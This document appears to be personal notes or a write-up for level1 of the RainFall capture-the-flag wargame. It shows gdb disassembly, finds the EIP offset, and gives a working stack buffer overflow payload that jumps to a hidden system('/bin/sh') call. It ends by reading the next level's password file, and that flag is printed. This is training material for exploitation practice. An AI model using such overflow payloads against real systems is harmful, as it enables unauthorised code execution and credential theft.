https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

level1@RainFall:~$ gdb ./level1
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.

(gdb) disassemble main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret

Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x80497c0,%eax
   0x0804844f <+11>:    mov    %eax,%edx
   0x08048451 <+13>:    mov    $0x8048570,%eax
   0x08048456 <+18>:    mov    %edx,0xc(%esp)
   0x0804845a <+22>:    movl   $0x13,0x8(%esp)
   0x08048462 <+30>:    movl   $0x1,0x4(%esp)
   0x0804846a <+38>:    mov    %eax,(%esp)
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    movl   $0x8048584,(%esp)
   0x08048479 <+53>:    call   0x8048360 <system@plt>


There is a SECOND function called run() which is never executed:

int32_t run()

0804846d  fwrite(0x8048570, 1, 0x13, *stdout)  {"Good... Wait what?\n"}
0804847f  return system(0x8048584)  {"/bin/sh"}

the address of the run function is is 0x0804844


gdb ./level1
---long overflow string---

eip = 0x63413563 when segfault -> offset 76

./level1

echo "123456789012345678901234567890123456789012345678901234567890123456789012345" > /dev/shm/1 -> no segfault
echo "1234567890123456789012345678901234567890123456789012345678901234567890123456" > /dev/shm/1 -> illegal instruction
echo "12345678901234567890123456789012345678901234567890123456789012345678901234567" > /dev/shm/1 -> segfault


echo -e "1234567890123456789012345678901234567890123456789012345678901234567890123456\x44\x84\x04\x08" > /tmp/expl
echo -e `python -c "print(\"A\"*76 + '\x44\x84\x04\x08')"` > /tmp/expl

cat /tmp/expl - | ./level1
Good... Wait what?
whoami
level2
cd /home/user/level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

SUCCESS :D
